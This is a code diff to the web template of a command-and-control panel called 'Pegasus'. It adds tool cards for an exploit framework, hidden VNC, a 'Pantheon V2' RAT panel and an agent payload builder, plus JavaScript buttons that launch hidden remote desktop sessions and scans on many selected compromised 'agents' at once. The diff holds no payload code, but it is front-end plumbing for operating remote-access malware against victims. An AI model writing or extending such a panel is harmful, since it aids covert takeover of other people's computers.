@@ -14,6 +14,54 @@
         </div>
       </div>
 
+      <!-- Tools Panel -->
+      <div class="tools-panel">
+        <h3>🛠️ Pegasus Tools & Extensions</h3>
+        <div class="tools-grid">
+          <div class="tool-card">
+            <div class="tool-icon">🔍</div>
+            <h4>Web Scanner</h4>
+            <p>Comprehensive web vulnerability scanner</p>
+            <a href="{{ url_for('webui.web_scanner') }}" class="btn btn-tool">Launch Scanner</a>
+          </div>
+
+          <div class="tool-card">
+            <div class="tool-icon">💥</div>
+            <h4>Exploit Framework</h4>
+            <p>BTS API penetration testing tool</p>
+            <a href="{{ url_for('webui.exploit_tool') }}" class="btn btn-tool">Launch Exploit</a>
+          </div>
+
+          <div class="tool-card">
+            <div class="tool-icon">🖥️</div>
+            <h4>HVNC Control</h4>
+            <p>Hidden Virtual Network Computing</p>
+            <a href="{{ url_for('webui.hvnc_tool') }}" class="btn btn-tool">Launch HVNC</a>
+          </div>
+
+          <div class="tool-card">
+            <div class="tool-icon">🏛️</div>
+            <h4>Pantheon V2</h4>
+            <p>Advanced RAT control panel</p>
+            <a href="{{ url_for('webui.pantheon_tool') }}" class="btn btn-tool">Launch Pantheon</a>
+          </div>
+
+          <div class="tool-card">
+            <div class="tool-icon">🔧</div>
+            <h4>Agent Builder</h4>
+            <p>Build custom agent payloads</p>
+            <button onclick="launchAgentBuilder()" class="btn btn-tool">Build Agent</button>
+          </div>
+
+          <div class="tool-card">
+            <div class="tool-icon">📊</div>
+            <h4>System Monitor</h4>
+            <p>Real-time system monitoring</p>
+            <button onclick="launchSystemMonitor()" class="btn btn-tool">Monitor System</button>
+          </div>
+        </div>
+      </div>
+
       <!-- Control Panel -->
       <div class="control-panel">
         <form method="post" action="{{ url_for('api.mass_execute') }}" class="mass-action-form">
@@ -40,6 +88,14 @@
                 onclick="return confirm('Remove selected agents from list?')">
                 <span class="btn-icon">🗑️</span>
                 Delete Selected
+              </button>
+              <button type="button" onclick="launchMassHVNC()" class="btn btn-hvnc">
+                <span class="btn-icon">🖥️</span>
+                Mass HVNC
+              </button>
+              <button type="button" onclick="launchMassScan()" class="btn btn-scan">
+                <span class="btn-icon">🔍</span>
+                Mass Scan
               </button>
             </div>
           </div>
@@ -273,6 +329,314 @@
       }
     }
   });
+
+  // Pegasus Tools Functions
+  function launchAgentBuilder() {
+    const selectedAgents = $('.agent-checkbox:checked');
+    if (selectedAgents.length === 0) {
+      alert('Please select at least one agent to build payload for!');
+      return;
+    }
+
+    const agentIds = [];
+    selectedAgents.each(function () {
+      agentIds.push($(this).val());
+    });
+
+    // Open agent builder in new window
+    const builderUrl = `/tools/agent-builder?agents=${agentIds.join(',')}`;
+    window.open(builderUrl, 'AgentBuilder', 'width=800,height=600,scrollbars=yes');
+  }
+
+  function launchSystemMonitor() {
+    const selectedAgents = $('.agent-checkbox:checked');
+    if (selectedAgents.length === 0) {
+      alert('Please select at least one agent to monitor!');
+      return;
+    }
+
+    const agentIds = [];
+    selectedAgents.each(function () {
+      agentIds.push($(this).val());
+    });
+
+    // Open system monitor in new window
+    const monitorUrl = `/tools/system-monitor?agents=${agentIds.join(',')}`;
+    window.open(monitorUrl, 'SystemMonitor', 'width=1200,height=800,scrollbars=yes');
+  }
+
+  function launchMassHVNC() {
+    const selectedAgents = $('.agent-checkbox:checked');
+    if (selectedAgents.length === 0) {
+      alert('Please select at least one agent for HVNC!');
+      return;
+    }
+
+    if (!confirm(`Launch HVNC on ${selectedAgents.length} selected agent(s)?`)) {
+      return;
+    }
+
+    const agentIds = [];
+    selectedAgents.each(function () {
+      agentIds.push($(this).val());
+    });
+
+    // Launch HVNC for selected agents
+    $.post('/api/mass-hvnc', {
+      agents: agentIds
+    }).done(function (response) {
+      alert('HVNC launched successfully on selected agents!');
+      // Open HVNC control panel
+      window.open('/tools/hvnc', 'HVNCControl', 'width=1024,height=768,scrollbars=yes');
+    }).fail(function () {
+      alert('Failed to launch HVNC. Please try again.');
+    });
+  }
+
+  function launchMassScan() {
+    const selectedAgents = $('.agent-checkbox:checked');
+    if (selectedAgents.length === 0) {
+      alert('Please select at least one agent to scan!');
+      return;
+    }
+
+    const scanType = prompt('Enter scan type (web, network, system):', 'web');
+    if (!scanType) return;
+
+    if (!confirm(`Launch ${scanType} scan on ${selectedAgents.length} selected agent(s)?`)) {
+      return;
+    }
+
+    const agentIds = [];
+    selectedAgents.each(function () {
+      agentIds.push($(this).val());
+    });
+
+    // Launch scan for selected agents
+    $.post('/api/mass-scan', {
+      agents: agentIds,
+      scan_type: scanType
+    }).done(function (response) {
+      alert(`${scanType} scan launched successfully on selected agents!`);
+      // Open scan results window
+      window.open(`/tools/scan-results?scan_id=${response.scan_id}`, 'ScanResults', 'width=1200,height=800,scrollbars=yes');
+    }).fail(function () {
+      alert('Failed to launch scan. Please try again.');
+    });
+  }
+
+  // Tool card animations
+  $(document).ready(function () {
+    $('.tool-card').hover(
+      function () {
+        $(this).addClass('tool-card-hover');
+      },
+      function () {
+        $(this).removeClass('tool-card-hover');
+      }
+    );
+  });
 </script>
+
+<style>
+  /* Tools Panel Styles - Compact Design */
+  .tools-panel {
+    background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+    border: 1px solid #00ff41;
+    border-radius: 6px;
+    padding: 12px;
+    margin-bottom: 15px;
+    box-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
+  }
+
+  .tools-panel h3 {
+    color: #00ff41;
+    margin-bottom: 10px;
+    text-align: center;
+    font-size: 1.1em;
+    text-shadow: 0 0 5px rgba(0, 255, 65, 0.3);
+  }
+
+  .tools-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+    gap: 8px;
+    margin-top: 10px;
+  }
+
+  .tool-card {
+    background: linear-gradient(145deg, #2a2a2a, #1e1e1e);
+    border: 1px solid #333;
+    border-radius: 4px;
+    padding: 8px;
+    text-align: center;
+    transition: all 0.2s ease;
+    cursor: pointer;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .tool-card:hover,
+  .tool-card-hover {
+    border-color: #00ff41;
+    box-shadow: 0 0 8px rgba(0, 255, 65, 0.3);
+    transform: translateY(-1px);
+  }
+
+  .tool-card::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.1), transparent);
+    transition: left 0.3s;
+  }
+
+  .tool-card:hover::before {
+    left: 100%;
+  }
+
+  .tool-icon {
+    font-size: 1.5em;
+    margin-bottom: 5px;
+    filter: drop-shadow(0 0 3px rgba(0, 255, 65, 0.3));
+  }
+
+  .tool-card h4 {
+    color: #00ff41;
+    margin: 5px 0;
+    font-size: 0.9em;
+  }
+
+  .tool-card p {
+    color: #ccc;
+    font-size: 0.7em;
+    margin-bottom: 8px;
+    line-height: 1.2;
+    display: none;
+    /* Hide description on small cards */
+  }
+
+  .btn-tool {
+    background: linear-gradient(45deg, #00ff41, #00cc33);
+    color: #000;
+    border: none;
+    padding: 4px 8px;
+    border-radius: 3px;
+    font-weight: bold;
+    text-decoration: none;
+    display: inline-block;
+    transition: all 0.2s ease;
+    cursor: pointer;
+    font-size: 0.8em;
+  }
+
+  .btn-tool:hover {
+    background: linear-gradient(45deg, #00cc33, #00ff41);
+    box-shadow: 0 0 5px rgba(0, 255, 65, 0.4);
+    transform: scale(1.02);
+    color: #000;
+    text-decoration: none;
+  }
+
+  /* Enhanced Action Buttons */
+  .btn-hvnc {
+    background: linear-gradient(45deg, #ff6b35, #f7931e);
+    color: white;
+    border: none;
+    padding: 10px 15px;
+    border-radius: 5px;
+    font-weight: bold;
+    transition: all 0.3s ease;
+    cursor: pointer;
+  }
+
+  .btn-hvnc:hover {
+    background: linear-gradient(45deg, #f7931e, #ff6b35);
+    box-shadow: 0 0 10px rgba(255, 107, 53, 0.5);
+    transform: scale(1.05);
+  }
+
+  .btn-scan {
+    background: linear-gradient(45deg, #667eea, #764ba2);
+    color: white;
+    border: none;
+    padding: 10px 15px;
+    border-radius: 5px;
+    font-weight: bold;
+    transition: all 0.3s ease;
+    cursor: pointer;
+  }
+
+  .btn-scan:hover {
+    background: linear-gradient(45deg, #764ba2, #667eea);
+    box-shadow: 0 0 10px rgba(102, 126, 234, 0.5);
+    transform: scale(1.05);
+  }
+
+  /* Enhanced Control Panel */
+  .control-panel {
+    background: linear-gradient(135deg, #1e1e1e 0%, #2a2a2a 100%);
+    border: 1px solid #00ff41;
+    border-radius: 10px;
+    padding: 20px;
+    margin-bottom: 20px;
+    box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
+  }
+
+  .action-buttons {
+    display: flex;
+    gap: 10px;
+    flex-wrap: wrap;
+    margin-top: 15px;
+  }
+
+  /* Responsive Design */
+  @media (max-width: 768px) {
+    .tools-grid {
+      grid-template-columns: 1fr;
+    }
+
+    .action-buttons {
+      flex-direction: column;
+    }
+
+    .action-buttons button {
+      width: 100%;
+      margin-bottom: 5px;
+    }
+  }
+
+  /* Loading Animation for Tools */
+  .tool-loading {
+    position: relative;
+  }
+
+  .tool-loading::after {
+    content: '';
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    width: 20px;
+    height: 20px;
+    margin: -10px 0 0 -10px;
+    border: 2px solid #00ff41;
+    border-top: 2px solid transparent;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+
+  @keyframes spin {
+    0% {
+      transform: rotate(0deg);
+    }
+
+    100% {
+      transform: rotate(360deg);
+    }
+  }
+</style>
 
 {% include "footer.html" %}
